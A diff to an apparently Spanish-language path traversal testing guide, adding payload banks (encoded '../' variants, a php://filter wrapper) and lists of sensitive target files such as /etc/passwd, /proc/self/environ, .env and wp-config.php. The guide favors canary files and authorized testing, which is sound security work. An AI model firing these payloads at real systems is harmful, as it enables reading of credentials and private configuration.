@@ -8,7 +8,104 @@
 - Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
 - Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.
 
-## 🔬 Pruebas por escenario
+> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.
+
+## 💉 Payloads básicos
+
+### Traversal mínimo con archivo canary
+
+```text
+../canary-{NONCE}.txt
+../../canary-{NONCE}.txt
+..\canary-{NONCE}.txt
+..\..\canary-{NONCE}.txt
+```
+
+**Cuándo usarlo:** Poner el archivo marcador en un directorio propio fuera de la raíz permitida; la profundidad depende del despliegue.
+
+**Fuente:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).
+
+
+### Archivos convencionales para lectura acotada
+
+```text
+/etc/hosts
+/etc/hostname
+/proc/version
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+```
+
+**Cuándo usarlo:** Estos nombres ayudan a identificar sistema; usar un canary propio cuando sea posible y nunca conservar secretos.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).
+
+
+### Rutas comunes de configuración Linux y aplicaciones
+
+```text
+/etc/passwd
+/etc/hosts
+/proc/self/cmdline
+/proc/self/environ
+/var/www/html/.env
+/var/www/html/config.php
+/var/www/html/wp-config.php
+/etc/nginx/nginx.conf
+```
+
+**Cuándo usarlo:** Las rutas pueden contener secretos: leer solo lo necesario para una prueba autorizada y redactar la evidencia.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).
+
+
+### Rutas comunes en Windows e IIS
+
+```text
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\inetpub\wwwroot\web.config
+C:\xampp\apache\conf\httpd.conf
+```
+
+**Cuándo usarlo:** Su existencia depende del despliegue; preferir canary propio y evitar extraer credenciales.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).
+
+
+## 🧭 Payloads por contexto
+
+### Codificación y normalización
+
+```text
+..%2f..%2fcanary-{NONCE}.txt
+%2e%2e/%2e%2e/canary-{NONCE}.txt
+..%252f..%252fcanary-{NONCE}.txt
+....//....//canary-{NONCE}.txt
+..%5c..%5ccanary-{NONCE}.txt
+```
+
+**Cuándo usarlo:** Cada línea presupone un orden de decodificación distinto; comparar URL enviada y ruta efectiva.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md).
+
+
+## 🔥 Payloads avanzados
+
+### Prefijo obligatorio y wrapper PHP
+
+```text
+/var/www/html/../../../canary-{NONCE}.txt
+..;/..;/canary-{NONCE}.txt
+php://filter/convert.base64-encode/resource={ARCHIVO_PROPIO}
+```
+
+**Cuándo usarlo:** El wrapper requiere PHP y un include compatible; base64 de un canary propio evita guardar datos privados.
+
+**Fuente:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md).
+
+
+## 🔬 Pruebas guiadas por escenario
 
 ### 1. Traversal relativo
 
@@ -20,7 +117,7 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 
 **Interpretación:** Solo confirma traversal si el contenido único del archivo aparece. `--path-as-is` evita normalización del cliente.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/file-path-traversal).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).
 
 ### 2. Separadores codificados
 
@@ -32,7 +129,7 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 
 **Interpretación:** Comparar con el marcador literal y con URL de control; dependerá del orden de decodificación.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
 
 ### 3. Doble codificación
 
@@ -44,7 +141,7 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 
 **Interpretación:** Solo funciona si una capa decodifica `%25` y otra `%2f`; no asumirlo por un 200.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/file-path-traversal).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).
 
 ### 4. Filtro no recursivo
 
@@ -56,7 +153,7 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 
 **Interpretación:** Debe leerse el canary externo; un error con ruta normalizada ayuda a entender el filtro.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
 
 ### 5. Ruta absoluta
 
@@ -68,7 +165,7 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 
 **Interpretación:** Usar un archivo colocado por el tester en laboratorio; no solicitar `/etc/passwd`.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/file-path-traversal).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).
 
 ### 6. Windows con barra inversa
 
@@ -80,7 +177,7 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 
 **Interpretación:** En Linux puede ser literal; verificar tecnología antes de interpretar.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
 
 ### 7. Punto y coma en proxy Java
 
@@ -92,7 +189,7 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 
 **Interpretación:** Requiere stack compatible; registrar ruta vista por frontend y backend si hay logs autorizados.
 
-**Fuente técnica:** [documentación de la técnica](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
 
 ### 8. Byte nulo histórico
 
@@ -104,7 +201,31 @@ curl --path-as-is "https://{ORIGEN}/download?file=../../marcador-{NONCE}.txt"
 
 **Interpretación:** La mayoría de stacks modernos rechaza `%00`; una respuesta 200 no prueba truncamiento.
 
-**Fuente técnica:** [documentación de la técnica](https://portswigger.net/web-security/file-path-traversal).
+**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/file-path-traversal).
+
+### 9. Puntos codificados
+
+**Objetivo:** Probar si el servidor decodifica los puntos antes de validar segmentos.
+
+```text
+%2e%2e/%2e%2e/marcador-{NONCE}.txt
+```
+
+**Interpretación:** Requiere canary externo propio. Una ruta aceptada que devuelve 404 no prueba lectura.
+
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
+
+### 10. Barra inversa codificada
+
+**Objetivo:** Comprobar normalización de separador Windows.
+
+```text
+..%5c..%5cmarcador-{NONCE}.txt
+```
+
+**Interpretación:** Solo relevante en stacks que interpretan barra inversa como separador después de decodificar.
+
+**Fuente técnica:** [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal).
 
 ## ✅ Evidencia mínima
 
